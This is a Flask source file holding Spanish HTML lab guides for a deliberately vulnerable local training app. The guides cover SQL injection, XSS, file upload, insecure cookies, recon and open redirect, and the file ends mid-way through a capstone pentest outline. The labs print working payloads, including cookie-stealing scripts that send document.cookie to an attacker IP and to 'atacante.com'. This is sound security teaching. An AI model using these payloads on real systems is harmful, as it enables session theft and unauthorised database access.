from flask import Blueprint, render_template, abort

bp = Blueprint('labs', __name__)

# Base de datos estática de los Laboratorios (Guías paso a paso)
LABS = {
    "lab-01-sql-injection-login": {
        "title": "Laboratorio 01: SQL Injection (Bypass de Autenticación)",
        "summary": "Lograr acceso administrativo a la plataforma sin conocer la contraseña del usuario 'admin', explotando una vulnerabilidad de Inyección SQL en el formulario de inicio de sesión.",
        "content": """
            <h2>🎯 Objetivo</h2>
            <p>Lograr acceso administrativo a la plataforma sin conocer la contraseña del usuario 'admin', explotando una vulnerabilidad de Inyección SQL en el formulario de inicio de sesión.</p>

            <h2>📋 Prerrequisitos</h2>
            <ol>
                <li>El entorno Docker debe estar corriendo (<code>docker-compose up</code>).</li>
                <li>Asegúrate de que el <strong>Modo Vulnerable</strong> (botón rojo) esté activo en la barra de navegación.</li>
                <li>Navegador web.</li>
            </ol>

            <h2>📝 Instrucciones Paso a Paso</h2>

            <h3>Paso 1: Reconocimiento</h3>
            <ol>
                <li>Navega a la página de inicio de sesión: <code>http://localhost:8080/login</code>.</li>
                <li>Intenta iniciar sesión con credenciales aleatorias (ej. <code>test</code> / <code>test</code>) y observa el mensaje de error.</li>
            </ol>

            <h3>Paso 2: Detección de Vulnerabilidad</h3>
            <ol>
                <li>En el campo <strong>Usuario</strong>, introduce una comilla simple <code>'</code>.</li>
                <li>En el campo <strong>Contraseña</strong>, introduce cualquier cosa.</li>
                <li>Si la aplicación devuelve un error de base de datos o un comportamiento inesperado (como un error 500), es probable que sea vulnerable.</li>
            </ol>

            <h3>Paso 3: Explotación (Bypass)</h3>
            <ol>
                <li>Queremos inyectar una condición que siempre sea verdadera (<code>OR 1=1</code>) y comentar el resto de la consulta para anular la verificación de contraseña.</li>
                <li>Introduce el siguiente payload en el campo <strong>Usuario</strong>:
                    <pre><code class="language-sql">admin' OR '1'='1' -- -</code></pre>
                    <em>Nota: Asegúrate de incluir el espacio después del segundo guion.</em>
                </li>
                <li>Introduce cualquier valor en el campo <strong>Contraseña</strong>.</li>
                <li>Haz clic en "Entrar".</li>
            </ol>

            <h2>🏁 Verificación</h2>
            <ul>
                <li>Deberías ser redirigido al <strong>Dashboard</strong> o <strong>Mi Perfil</strong>.</li>
                <li>Verifica que has iniciado sesión como el usuario <strong>admin</strong>.</li>
            </ul>

            <h2>🛡️ Preguntas de Reflexión</h2>
            <ol>
                <li>¿Por qué el uso de comillas simples rompe la consulta SQL original?</li>
                <li>¿Qué hace exactamente la secuencia <code>-- -</code> o <code>#</code> al final de la inyección?</li>
            </ol>
        """
    },
    "lab-02-sql-injection-chat": {
        "title": "Laboratorio 02: SQL Injection (Extracción de Datos)",
        "summary": "Extraer información sensible de la base de datos (versión, usuarios) utilizando una vulnerabilidad de SQL Injection basada en UNION en el buscador del chat.",
        "content": """
            <h2>🎯 Objetivo</h2>
            <p>Extraer información sensible de la base de datos (versión, usuarios) utilizando una vulnerabilidad de SQL Injection basada en UNION en el buscador del chat.</p>

            <h2>📋 Prerrequisitos</h2>
            <ol>
                <li>Tener una sesión activa (puedes usar el Lab 01 para entrar como admin o registrar un usuario nuevo).</li>
                <li>Modo Vulnerable activo.</li>
            </ol>

            <h2>📝 Instrucciones Paso a Paso</h2>

            <h3>Paso 1: Localizar la Vulnerabilidad</h3>
            <ol>
                <li>Ve a la sección de <strong>Chat</strong> (<code>/chat</code>).</li>
                <li>Localiza el formulario "Buscar Alumno".</li>
                <li>Introduce una comilla simple <code>'</code> y busca. Observa si hay errores.</li>
            </ol>

            <h3>Paso 2: Determinar el número de columnas</h3>
            <ol>
                <li>Para usar <code>UNION</code>, necesitamos saber cuántas columnas devuelve la consulta original.</li>
                <li>Prueba inyectando <code>ORDER BY</code>:
                    <ul>
                        <li><code>' ORDER BY 1 -- -</code> (Si no da error, hay al menos 1 columna)</li>
                        <li><code>' ORDER BY 5 -- -</code> (Si da error, hay menos de 5)</li>
                    </ul>
                </li>
                <li>Encuentra el número exacto donde deja de dar error. (Pista: Son 2 columnas: id y username).</li>
            </ol>

            <h3>Paso 3: Inyección UNION</h3>
            <ol>
                <li>Una vez confirmado el número de columnas (2), inyecta una consulta para unir resultados.</li>
                <li>Prueba:
                    <pre><code class="language-sql">' UNION SELECT 1, @@version -- -</code></pre>
                </li>
                <li>Observa los resultados de la búsqueda. Deberías ver la versión de MySQL en lugar de un nombre de usuario.</li>
            </ol>

            <h3>Paso 4: Extracción de Datos</h3>
            <ol>
                <li>Intenta extraer los nombres de usuario y contraseñas de la tabla <code>users</code>.</li>
                <li>Payload:
                    <pre><code class="language-sql">' UNION SELECT username, password FROM users -- -</code></pre>
                </li>
            </ol>

            <h2>🏁 Verificación</h2>
            <ul>
                <li>En la lista de resultados de búsqueda, deberías ver una lista de usuarios junto con sus contraseñas (o hashes).</li>
            </ul>

            <h2>🛡️ Preguntas de Reflexión</h2>
            <ol>
                <li>¿Por qué es necesario que el número de columnas coincida en una inyección UNION?</li>
                <li>¿Cómo podrías automatizar este proceso usando SQLMap?</li>
            </ol>
        """
    },
    "lab-03-xss-reflected": {
        "title": "Laboratorio 03: Cross-Site Scripting (Reflected)",
        "summary": "Ejecutar código JavaScript arbitrario en el navegador reflejándolo a través del motor de búsqueda de la aplicación.",
        "content": """
            <h2>🎯 Objetivo</h2>
            <p>Ejecutar código JavaScript arbitrario en el navegador reflejándolo a través del motor de búsqueda de la aplicación.</p>

            <h2>📋 Prerrequisitos</h2>
            <ol>
                <li>Modo Vulnerable activo.</li>
            </ol>

            <h2>📝 Instrucciones Paso a Paso</h2>

            <h3>Paso 1: Identificar el punto de entrada</h3>
            <ol>
                <li>Ve a la página de <strong>Inicio</strong> o usa la barra de navegación para ir a <strong>Buscar</strong>.</li>
                <li>Busca una palabra normal, por ejemplo "hola".</li>
                <li>Observa que la palabra "hola" se refleja en la página de resultados: "Resultados para: hola".</li>
            </ol>

            <h3>Paso 2: Prueba de inyección HTML</h3>
            <ol>
                <li>Busca: <code>&lt;h1&gt;Prueba&lt;/h1&gt;</code>.</li>
                <li>Si el texto "Prueba" aparece en grande (formato título), significa que el HTML se está interpretando.</li>
            </ol>

            <h3>Paso 3: Ejecución de JavaScript</h3>
            <ol>
                <li>Intenta inyectar un script simple.</li>
                <li>Payload:
                    <pre><code class="language-html">&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>
                </li>
                <li>Pulsa Buscar.</li>
            </ol>

            <h2>🏁 Verificación</h2>
            <ul>
                <li>Debería aparecer una ventana emergente (alert) con el texto "XSS".</li>
                <li>Esto confirma que cualquier script enviado en la URL será ejecutado por el navegador.</li>
            </ul>

            <h2>🛡️ Preguntas de Reflexión</h2>
            <ol>
                <li>¿Cómo podría un atacante usar esto contra otro usuario? (Pista: Enlaces maliciosos).</li>
                <li>¿Qué diferencia hay entre este XSS y el Stored?</li>
            </ol>
        """
    },
    "lab-04-xss-stored": {
        "title": "Laboratorio 04: Cross-Site Scripting (Stored)",
        "summary": "Inyectar un script malicioso que se almacene en la base de datos y se ejecute automáticamente cuando otros usuarios visiten la página afectada.",
        "content": """
            <h2>🎯 Objetivo</h2>
            <p>Inyectar un script malicioso que se almacene en la base de datos y se ejecute automáticamente cuando otros usuarios visiten la página afectada.</p>

            <h2>📋 Prerrequisitos</h2>
            <ol>
                <li>Sesión activa.</li>
                <li>Modo Vulnerable activo.</li>
            </ol>

            <h2>📝 Instrucciones Paso a Paso</h2>

            <h3>Escenario A: Foro</h3>
            <ol>
                <li>Ve al <strong>Foro</strong>.</li>
                <li>Crea una nueva publicación.</li>
                <li>En el contenido, introduce:
                    <pre><code class="language-html">&lt;script&gt;alert('XSS en Foro')&lt;/script&gt;</code></pre>
                </li>
                <li>Publica el tema.</li>
                <li>Regresa al listado del foro. La alerta debería saltar inmediatamente.</li>
            </ol>

            <h3>Escenario B: Perfil de Usuario</h3>
            <ol>
                <li>Ve a <strong>Mi Perfil</strong>.</li>
                <li>Edita tu información.</li>
                <li>En el campo <strong>Bio</strong>, introduce:
                    <pre><code class="language-html">&lt;b&gt;Hacker&lt;/b&gt;&lt;img src=x onerror=alert('XSS Perfil')&gt;</code></pre>
                </li>
                <li>Guarda los cambios.</li>
                <li>Recarga la página.</li>
            </ol>

            <h2>🏁 Verificación</h2>
            <ul>
                <li>La ejecución del código JavaScript (alertas) debe ocurrir cada vez que se carga la página donde se guardó el dato, sin necesidad de que el usuario realice ninguna acción adicional.</li>
            </ul>

            <h2>🛡️ Preguntas de Reflexión</h2>
            <ol>
                <li>¿Por qué el XSS Stored se considera más peligroso que el Reflected?</li>
                <li>¿Qué pasaría si inyectaras un script que redirige a los usuarios a otro sitio web?</li>
            </ol>
        """
    },
    "lab-04b-xss-advanced": {
        "title": "Laboratorio 04b: XSS Almacenado Avanzado",
        "summary": "Realizar ataques de redirección y exfiltración de cookies mediante XSS persistente, utilizando herramientas como Burp Suite y un listener en Python.",
        "content": """
            <h2>🎯 Objetivo</h2>
            <p>Explotar una vulnerabilidad de XSS Persistente en el Foro o Chat para realizar ataques avanzados: redirección forzada de usuarios y exfiltración de cookies de sesión a un servidor externo.</p>

            <h2>📋 Prerrequisitos</h2>
            <ol>
                <li><strong>Entorno:</strong> Cadel Academy en Modo Vulnerable (<code>http://localhost:8080</code>).</li>
                <li><strong>Máquina Atacante:</strong> Kali Linux (o similar con Python y Burp Suite).</li>
                <li><strong>Conectividad:</strong> Asegúrate de que la máquina atacante y la víctima (servidor Docker) se ven entre sí.</li>
            </ol>

            <hr>

            <h2>📝 Ejercicio 1: Redirección Maliciosa (The Prank)</h2>
            <p><strong>Objetivo:</strong> Inyectar un script que redirija a cualquier usuario que vea el post a un video de YouTube.</p>

            <h3>Paso 1: Preparar la Interceptación (Opcional con Burp Suite)</h3>
            <ol>
                <li>Abre <strong>Burp Suite</strong> en tu máquina atacante.</li>
                <li>Configura el navegador para usar Burp como proxy.</li>
                <li>Navega a la sección <strong>Foro</strong> (<code>/forum</code>) de Cadel Academy.</li>
                <li>Crea un nuevo tema. Rellena el título y el contenido con texto normal.</li>
                <li>Activa <strong>"Intercept On"</strong> en Burp Suite.</li>
                <li>Haz clic en "Publicar" en la web.</li>
            </ol>

            <h3>Paso 2: Inyección del Payload</h3>
            <ol>
                <li>En Burp Suite, verás la petición <code>POST /forum</code>.</li>
                <li>Localiza el parámetro <code>content</code> o <code>title</code>.</li>
                <li>Modifica el contenido para incluir el siguiente script JavaScript:
                    <pre><code class="language-html">&lt;script&gt;window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";&lt;/script&gt;</code></pre>
                </li>
                <li>Haz clic en <strong>"Forward"</strong> para enviar la petición modificada.</li>
            </ol>

            <h3>Paso 3: Verificación</h3>
            <ol>
                <li>Desactiva la interceptación en Burp.</li>
                <li>Accede al Foro como un usuario normal (o refresca la página).</li>
                <li><strong>Resultado:</strong> Deberías ser redirigido automáticamente a YouTube. ¡Has secuestrado la navegación del usuario!</li>
            </ol>

            <hr>

            <h2>📝 Ejercicio 2: Exfiltración de Datos (Cookie Stealing)</h2>
            <p><strong>Objetivo:</strong> Robar la cookie de sesión (<code>user_id</code>) de la víctima y enviarla a tu servidor atacante.</p>

            <h3>Paso 1: Configurar el Servidor Atacante (Listener)</h3>
            <p>Necesitamos un servidor que reciba los datos robados. Usaremos Python en tu máquina atacante (Kali).</p>
            <ol>
                <li>Abre una terminal.</li>
                <li>Averigua tu dirección IP (ej. <code>ip a</code> o <code>ifconfig</code>). Supongamos que es <code>192.168.1.50</code>.</li>
                <li>Inicia un servidor HTTP simple en el puerto 8000:
                    <pre><code class="language-bash">python3 -m http.server 8000</code></pre>
                    <em>Ahora tu máquina está esperando peticiones.</em>
                </li>
            </ol>

            <h3>Paso 2: Construir el Payload</h3>
            <p>El script debe leer <code>document.cookie</code> y hacer una petición a tu IP.</p>
            <p><strong>Payload:</strong></p>
            <pre><code class="language-html">&lt;script&gt;
  fetch('http://192.168.1.50:8000/?robado=' + document.cookie);
&lt;/script&gt;</code></pre>
            <p><em>(Reemplaza <code>192.168.1.50</code> por TU dirección IP real).</em></p>

            <h3>Paso 3: Inyección (Vía Chat o Foro)</h3>
            <ol>
                <li>Ve al <strong>Chat</strong> (<code>/chat</code>) o crea otro post en el <strong>Foro</strong>.</li>
                <li>Pega el payload directamente en el campo de mensaje o contenido.</li>
                <li>Envía el mensaje.</li>
            </ol>

            <h3>Paso 4: Captura de la Bandera (Flag)</h3>
            <ol>
                <li>Simula ser la víctima: Refresca la página del chat o entra al post del foro.</li>
                <li>Observa tu terminal donde corre el servidor Python.</li>
                <li>Deberías ver una línea similar a:
                    <pre><code class="language-text">172.18.0.1 - - [Fecha] "GET /?robado=user_id=1;%20security_level=vulnerable HTTP/1.1" 200 -</code></pre>
                </li>
                <li><strong>¡Éxito!</strong> Has capturado la cookie <code>user_id=1</code>. Un atacante real usaría esto para suplantar al administrador.</li>
            </ol>

            <hr>

            <h2>🛡️ Preguntas de Reflexión</h2>
            <ol>
                <li><strong>¿Por qué funciona <code>fetch</code> hacia otra IP?</strong> Aunque existe CORS, las peticiones simples como esta (GET sin cabeceras especiales) no requieren pre-flight y se envían. CORS impide leer la respuesta, pero no enviar la petición, que es lo que necesita el atacante.</li>
                <li><strong>¿Cómo evita esto el modo 'Seguro'?</strong> El modo seguro aplica codificación de salida (Output Encoding), convirtiendo <code>&lt;script&gt;</code> en <code>&amp;lt;script&amp;gt;</code>, que el navegador muestra como texto inofensivo.</li>
                <li><strong>¿Qué hace la bandera <code>HttpOnly</code>?</strong> Impide que JavaScript acceda a la cookie con <code>document.cookie</code>, haciendo inútil este vector de exfiltración para robar la sesión.</li>
            </ol>
        """
    },
    "lab-05-file-upload-rce": {
        "title": "Laboratorio 05: Unrestricted File Upload",
        "summary": "Subir un archivo con contenido ejecutable (HTML/JS) aprovechando la falta de validación en el formulario de subida del foro.",
        "content": """
            <h2>🎯 Objetivo</h2>
            <p>Subir un archivo con contenido ejecutable (HTML/JS) aprovechando la falta de validación en el formulario de subida del foro.</p>

            <h2>📋 Prerrequisitos</h2>
            <ol>
                <li>Sesión activa.</li>
                <li>Modo Vulnerable activo.</li>
            </ol>

            <h2>📝 Instrucciones Paso a Paso</h2>

            <h3>Paso 1: Preparar el Payload</h3>
            <ol>
                <li>Crea un archivo en tu ordenador llamado <code>exploit.html</code>.</li>
                <li>Añade el siguiente contenido:
<pre><code class="language-html">&lt;html&gt;
&lt;body&gt;
    &lt;h1&gt;Archivo Malicioso&lt;/h1&gt;
    &lt;script&gt;
        alert('XSS via File Upload: ' + document.domain);
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
                </li>
            </ol>

            <h3>Paso 2: Subida del Archivo</h3>
            <ol>
                <li>Ve al <strong>Foro</strong>.</li>
                <li>En el formulario de "Crear Nueva Publicación", rellena un título cualquiera.</li>
                <li>En el campo de archivo, selecciona tu <code>exploit.html</code>.</li>
                <li>Publica el tema.</li>
            </ol>

            <h3>Paso 3: Ejecución</h3>
            <ol>
                <li>Busca tu publicación en el tablón.</li>
                <li>Verás un enlace al archivo adjunto.</li>
                <li>Haz clic en el enlace.</li>
            </ol>

            <h2>🏁 Verificación</h2>
            <ul>
                <li>El archivo HTML debe abrirse en el navegador y ejecutar el script (mostrar la alerta).</li>
                <li>Esto demuestra que el servidor aceptó el archivo sin validar su extensión o contenido.</li>
            </ul>

            <h2>🛡️ Preguntas de Reflexión</h2>
            <ol>
                <li>Si el servidor interpretara PHP, ¿qué podrías haber logrado subiendo un archivo <code>.php</code>?</li>
                <li>¿Cómo se debería asegurar esta funcionalidad?</li>
            </ol>
        """
    },
    "lab-06-insecure-cookies": {
        "title": "Laboratorio 06: Gestión de Sesiones Insegura",
        "summary": "Analizar la configuración de las cookies de sesión y comprender cómo la falta de atributos de seguridad (HttpOnly, Secure) expone la sesión al robo.",
        "content": """
            <h2>🎯 Objetivo</h2>
            <p>Analizar la configuración de las cookies de sesión y comprender cómo la falta de atributos de seguridad (<code>HttpOnly</code>, <code>Secure</code>) expone la sesión al robo.</p>

            <h2>📋 Prerrequisitos</h2>
            <ol>
                <li>Sesión activa.</li>
                <li>Modo Vulnerable activo.</li>
                <li>Herramientas de Desarrollador del navegador (F12).</li>
            </ol>

            <h2>📝 Instrucciones Paso a Paso</h2>

            <h3>Paso 1: Inspección de Cookies</h3>
            <ol>
                <li>Abre las herramientas de desarrollador (F12).</li>
                <li>Ve a la pestaña <strong>Aplicación</strong> (Chrome/Edge) o <strong>Almacenamiento</strong> (Firefox).</li>
                <li>Despliega la sección <strong>Cookies</strong> y selecciona <code>localhost</code>.</li>
                <li>Observa las columnas <code>HttpOnly</code>, <code>Secure</code> y <code>SameSite</code> para la cookie <code>user_id</code> o <code>session</code>.
                    <ul><li>En modo vulnerable, deberían estar vacías o marcadas como inseguras.</li></ul>
                </li>
            </ol>

            <h3>Paso 2: Acceso vía JavaScript</h3>
            <ol>
                <li>Ve a la pestaña <strong>Consola</strong>.</li>
                <li>Escribe el comando:
                    <pre><code class="language-javascript">document.cookie</code></pre>
                </li>
                <li>Si puedes ver el contenido de la cookie (ej. <code>user_id=1</code>), significa que es vulnerable a robo mediante XSS.</li>
            </ol>

            <h3>Paso 3: Simulación de Robo</h3>
            <ol>
                <li>Imagina que has encontrado un XSS (Lab 03 o 04).</li>
                <li>El payload para robar esta cookie sería:
                    <pre><code class="language-html">&lt;script&gt;new Image().src='http://atacante.com/?cookie='+document.cookie;&lt;/script&gt;</code></pre>
                </li>
            </ol>

            <h2>🏁 Verificación</h2>
            <ul>
                <li>Confirmar que <code>document.cookie</code> devuelve valores sensibles en la consola.</li>
            </ul>

            <h2>🛡️ Preguntas de Reflexión</h2>
            <ol>
                <li>¿Qué impide el flag <code>HttpOnly</code>?</li>
                <li>¿Por qué es importante el flag <code>Secure</code> aunque la red interna sea "segura"?</li>
            </ol>
        """
    },
    "lab-07-reconnaissance": {
        "title": "Laboratorio 07: Reconocimiento y Archivos Ocultos",
        "summary": "Utilizar técnicas de reconocimiento básico para descubrir archivos y rutas ocultas que revelen información sensible del servidor.",
        "content": """
            <h2>🎯 Objetivo</h2>
            <p>Utilizar técnicas de reconocimiento básico para descubrir archivos y rutas ocultas que revelen información sensible del servidor.</p>

            <h2>📋 Prerrequisitos</h2>
            <ol>
                <li>Modo Vulnerable activo.</li>
                <li>Opcional: Herramienta <code>nmap</code> o <code>curl</code>.</li>
            </ol>

            <h2>📝 Instrucciones Paso a Paso</h2>

            <h3>Paso 1: Inspección de robots.txt</h3>
            <ol>
                <li>Los administradores suelen usar <code>robots.txt</code> para ocultar rutas a Google, pero esto también le dice a los hackers dónde mirar.</li>
                <li>Navega a: <code>http://localhost:8080/robots.txt</code>.</li>
                <li>Lee el contenido. Deberías ver una línea <code>Disallow: /secret_config</code>.</li>
            </ol>

            <h3>Paso 2: Acceso al recurso oculto</h3>
            <ol>
                <li>Intenta navegar a la ruta descubierta: <code>http://localhost:8080/secret_config</code>.</li>
                <li>Observa el contenido devuelto.</li>
            </ol>

            <h3>Paso 3: Escaneo automatizado (Opcional)</h3>
            <ol>
                <li>Si tienes <code>nmap</code> instalado, abre una terminal.</li>
                <li>Ejecuta:
                    <pre><code class="language-bash">nmap -p 8080 --script http-enum localhost</code></pre>
                </li>
                <li>Observa si Nmap descubre automáticamente estas rutas.</li>
            </ol>

            <h2>🏁 Verificación</h2>
            <ul>
                <li>Debes haber encontrado credenciales o información de configuración en la ruta <code>/secret_config</code>.</li>
            </ul>

            <h2>🛡️ Preguntas de Reflexión</h2>
            <ol>
                <li>¿Es <code>robots.txt</code> un mecanismo de seguridad válido?</li>
                <li>¿Qué es la "Seguridad por Oscuridad" y por qué falla?</li>
            </ol>
        """
    },
    "lab-08-open-redirect": {
        "title": "Laboratorio 08: Open Redirect y Hijacking de Navegación",
        "summary": "Identificar y explotar vulnerabilidades de redirección abierta para dirigir a los usuarios a sitios externos maliciosos.",
        "content": """
            <h2>🎯 Objetivo</h2>
            <p>Identificar y explotar vulnerabilidades de redirección abierta para dirigir a los usuarios a sitios externos maliciosos, y diferenciar entre una redirección clásica y una basada en XSS.</p>

            <h2>📋 Prerrequisitos</h2>
            <ol>
                <li><strong>Entorno:</strong> Cadel Academy en Modo Vulnerable (<code>http://localhost:8080</code>).</li>
                <li><strong>Navegador Web</strong> con herramientas de desarrollador (F12).</li>
            </ol>

            <hr>

            <h2>📝 Ejercicio 1: Explotación de Open Redirect Clásico</h2>
            <p><strong>Objetivo:</strong> Abusar de una funcionalidad de redirección para enviar a un usuario a un sitio externo (YouTube).</p>

            <h3>Paso 1: Descubrir el Endpoint de Redirección</h3>
            <ol>
                <li>Durante la fase de reconocimiento, un auditor buscaría parámetros en la URL como <code>next</code>, <code>redirect</code>, <code>url</code>, <code>target</code>, etc.</li>
                <li>En Cadel Academy, hemos "descubierto" un endpoint en <code>http://localhost:8080/redirect</code>.</li>
            </ol>

            <h3>Paso 2: Construir el Payload</h3>
            <ol>
                <li>El endpoint espera un parámetro <code>target</code>. Vamos a construir una URL que apunte a YouTube.</li>
                <li>URL maliciosa:
                    <pre><code class="language-text">http://localhost:8080/redirect?target=https://www.youtube.com</code></pre>
                </li>
            </ol>

            <h3>Paso 3: Ejecución y Verificación</h3>
            <ol>
                <li>Abre las herramientas de desarrollador (F12) y ve a la pestaña <strong>Red (Network)</strong>.</li>
                <li>Pega la URL maliciosa en la barra de direcciones de tu navegador y pulsa Enter.</li>
                <li><strong>Observa la pestaña Red:</strong> Verás una primera petición a <code>/redirect?target=...</code> que recibe una respuesta con código de estado <strong>302 Found</strong>.</li>
                <li>Selecciona esa petición y mira las cabeceras de respuesta. Verás una cabecera <code>Location: https://www.youtube.com</code>.</li>
                <li><strong>Resultado:</strong> Tu navegador seguirá automáticamente esta cabecera y serás redirigido a YouTube.</li>
            </ol>

            <hr>

            <h2>📝 Ejercicio 2: Comparativa con Redirección vía XSS Stored</h2>
            <p><strong>Objetivo:</strong> Recordar cómo se logra una redirección utilizando una vulnerabilidad de XSS Almacenado, como se vio en el <strong>LAB-04b</strong>.</p>

            <h3>Paso 1: Inyectar el Payload XSS</h3>
            <ol>
                <li>Ve al <strong>Foro</strong> y crea una nueva publicación.</li>
                <li>En el contenido, inyecta el siguiente script:
                    <pre><code class="language-html">&lt;script&gt;window.location = "https://www.github.com";&lt;/script&gt;</code></pre>
                </li>
                <li>Publica el tema.</li>
            </ol>

            <h3>Paso 2: Verificación</h3>
            <ol>
                <li>Cada vez que tú u otro usuario visite la página principal del foro, el script se ejecutará y el navegador será redirigido a GitHub.</li>
            </ol>

            <hr>

            <h2>🛡️ Preguntas de Reflexión</h2>
            <ol>
                <li><strong>¿Cuál es la diferencia fundamental entre los dos ataques?</strong><ul><li>En el <strong>Open Redirect</strong>, el servidor es quien envía la orden de redirigir (cabecera <code>Location</code>). El navegador obedece.</li><li>En la <strong>Redirección por XSS</strong>, el servidor entrega una página con código malicioso. Es el JavaScript, ejecutándose en el cliente, quien da la orden de redirigir.</li></ul></li>
                <li><strong>¿Por qué un atacante preferiría un Open Redirect para un ataque de phishing?</strong><ul><li>Porque la URL inicial que la víctima ve pertenece a un dominio de confianza (ej. <code>https://banco.com/redirect?url=...</code>). Esto aumenta la probabilidad de que la víctima haga clic y confíe en la página de destino falsa.</li></ul></li>
                <li><strong>¿Cómo se soluciona un Open Redirect en el modo seguro?</strong><ul><li>Revisa el código en <code>app/routes/help.py</code>. La solución implementada valida que la URL de destino sea relativa o pertenezca al mismo dominio, bloqueando cualquier intento de redirección externa.</li></ul></li>
            </ol>
        """
    },
    "lab-09-full-audit-simulation": {
        "title": "Laboratorio 09: Simulación de Auditoría Web Completa (Capstone Project)",
        "summary": "Realizar una auditoría de seguridad integral (Pentest) a la plataforma CADEL Academy, simulando un encargo profesional real.",
        "content": """
            <h2>🎯 Objetivo</h2>
            <p>Realizar una auditoría de seguridad integral (Pentest) a la plataforma CADEL Academy, simulando un encargo profesional real. Este laboratorio consolida todos los conocimientos previos en un único ejercicio de flujo continuo, desde el reconocimiento hasta la verificación de parches.</p>

            <h2>📋 Escenario</h2>
            <p>Has sido contratado como consultor de seguridad externo por la organización "Cadel Academy". Tu misión es identificar, explotar y documentar todas las vulnerabilidades presentes en su plataforma educativa antes de que sean descubiertas por actores maliciosos. Posteriormente, deberás verificar que las correcciones implementadas por el equipo de desarrollo sean efectivas.</p>

            <h2>📝 Alcance y Reglas (Rules of Engagement)</h2>
            <ul>
                <li><strong>Objetivo:</strong> <code>http://localhost:8080</code> (Entorno Vulnerable) y <code>https://localhost:8443</code> (Entorno Seguro).</li>
                <li><strong>Metodología:</strong> OWASP Top 10.</li>
                <li><strong>Limitaciones:</strong> Prohibido realizar ataques de Denegación de Servicio (DoS), utilizar herramientas de escaneo automático agresivo que puedan degradar el servicio o realizar acciones que corrompan la integridad de los datos de forma permanente (ej. borrar usuarios o tablas).</li>
            </ul>

            <hr>

            <h2>🕵️ Fase 1: Reconocimiento y Mapeo (Information Gathering)</h2>
            <p>Antes de atacar, debes entender el objetivo.</p>
            <ol>
                <li><strong>Exploración Pasiva:</strong>
                    <ul>
                        <li>Navega por la aplicación como un usuario normal. Crea un mapa mental o un documento con las funcionalidades clave: Login, Registro, Buscador, Foro, Chat, Perfil, Blog.</li>
                        <li>Utiliza las <strong>Herramientas de Desarrollador del navegador (F12)</strong>. En la pestaña "Red", inspecciona las cabeceras de las peticiones. Busca cabeceras como <code>Server</code> o <code>X-Powered-By</code> para identificar tecnologías.</li>
                        <li><strong>Revisión de Código Fuente:</strong> Haz clic derecho -> "Ver código fuente de la página" (Ctrl+U). Busca comentarios HTML (<code>&lt;!-- ... --&gt;</code>) que puedan revelar pistas o lógica oculta.</li>
                    </ul>
                </li>
                <li><strong>Exploración Activa:</strong>
                    <ul>
                        <li><strong>Tarea:</strong> Completa el <strong>LAB-07 (Reconocimiento)</strong>.</li>
                        <li><strong>Metodología:</strong> Navega a <code>http://localhost:8080/robots.txt</code>. Este archivo a menudo revela rutas que los desarrolladores no quieren que los buscadores indexen, pero que son un tesoro para un auditor.</li>
                        <li><strong>Acción:</strong> Intenta acceder a las rutas que encuentres en <code>robots.txt</code>. ¿Qué información contienen?</li>
                        <li><strong>Entregable:</strong> Un documento simple con una lista de URLs interesantes, funcionalidades y tecnologías identificadas.</li>
                    </ul>
                </li>
            </ol>

            <h2>💥 Fase 2: Evaluación de Vulnerabilidades (Modo Vulnerable)</h2>
            <p>Activa el <strong>Modo Vulnerable</strong> (Puerto 8080). Tu objetivo es encontrar, explotar y documentar las siguientes vulnerabilidades.</p>

            <h3>2.1. Identificación y Autenticación (SQL Injection)</h3>
            <ul>
                <li><strong>Prueba:</strong> Bypass de autenticación en el formulario de login.</li>
                <li><strong>Vector:</strong> Inyección SQL en el campo de usuario.</li>
                <li><strong>Objetivo:</strong> Acceder como <code>admin</code> sin conocer su contraseña.</li>
                <li><strong>Guía:</strong> Sigue los pasos del <strong>LAB-01 (SQLi Login)</strong>.</li>
                <li><strong>Payload de ejemplo:</strong> <code>admin' OR '1'='1' -- -</code></li>
            </ul>

            <h3>2.2. Inyección SQL (Extracción de Datos)</h3>
            <ul>
                <li><strong>Prueba:</strong> Extracción de datos sensibles de la base de datos mediante UNION.</li>
                <li><strong>Vector:</strong> Buscador del Chat (<code>/chat</code>).</li>
                <li><strong>Objetivo:</strong> Extraer la lista de usuarios y contraseñas de la tabla <code>users</code>.</li>
                <li><strong>Guía:</strong> Sigue la metodología del <strong>LAB-02 (SQLi Chat)</strong>.</li>
                <li><strong>Payload de ejemplo:</strong> <code>' UNION SELECT username, password FROM users -- -</code></li>
            </ul>

            <h3>2.3. Cross-Site Scripting (XSS)</h3>
            <ul>
                <li><strong>Prueba (Reflected):</strong> Verifica si el buscador principal (<code>/search</code>) refleja el input del usuario sin sanitizar.
                    <ul>
                        <li><strong>Guía:</strong> <strong>LAB-03 (XSS Reflected)</strong>.</li>
                        <li><strong>Payload:</strong> <code>&lt;script&gt;alert('XSS Reflected')&lt;/script&gt;</code></li>
                    </ul>
                </li>
                <li><strong>Prueba (Stored):</strong> Intenta persistir un script en el Foro o en tu Perfil que afecte a otros visitantes.
                    <ul>
                        <li><strong>Objetivo:</strong> Lograr que aparezca un <code>alert(document.cookie)</code> o <code>alert(document.domain)</code>.</li>
                        <li><strong>Guía:</strong> <strong>LAB-04 (XSS Stored)</strong>.</li>
                        <li><strong>Payload:</strong> <code>&lt;img src=x onerror=alert(document.cookie)&gt;</code></li>
                    </ul>
                </li>
            </ul>

            <h3>2.4. Carga de Archivos Sin Restricciones (RCE)</h3>
            <ul>
                <li><strong>Prueba:</strong> Subir un archivo con contenido ejecutable en el lado del cliente.</li>
                <li><strong>Vector:</strong> Funcionalidad de adjuntar archivos en el Foro.</li>
                <li><strong>Objetivo:</strong> Lograr que el servidor almacene y sirva un archivo <code>.html</code> que ejecute JavaScript (HTML/JS o simulación de RCE) a través de un archivo adjunto.</li>
                <li><strong>Guía:</strong> Sigue las instrucciones del <strong>LAB-05 (File Upload)</strong>.</li>
            </ul>

            <h3>2.5. Fallos de Configuración de Seguridad (Cookies)</h3>
            <ul>
                <li><strong>Prueba:</strong> Análisis de la seguridad de las cookies de sesión.</li>
                <li><strong>Vector:</strong> Inspección de los atributos de las cookies.</li>
                <li><strong>Objetivo:</strong> Determinar si la cookie de sesión es vulnerable a robo (falta de <code>HttpOnly</code>) o interceptación (falta de <code>Secure</code>).</li>
                <li><strong>Guía:</strong> Utiliza la consola y la pestaña "Aplicación" de las herramientas de desarrollador, como se describe en el <strong>LAB-06 (Insecure Cookies)</strong>.</li>
            </ul>

            <hr>

            <h2>🛡️ Fase 3: Verificación y Análisis de Código (Modo Seguro)</h2>
